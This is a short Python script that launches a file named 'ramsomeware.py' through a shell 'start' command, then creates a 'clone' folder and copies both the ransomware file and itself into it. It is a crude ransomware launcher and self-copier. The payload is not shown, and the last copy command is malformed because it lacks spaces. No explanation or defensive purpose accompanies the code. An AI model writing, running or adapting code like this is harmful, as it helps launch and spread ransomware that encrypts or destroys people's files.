from sys import argv
import os 

script = argv
name = str (script[0])
cmd = 'start ramsomeware.py'

os.system(cmd)
os.mkdir('clone')
os.system(r"copy ramsomeware.py clone")
os.system(r"copy" + name + "clone")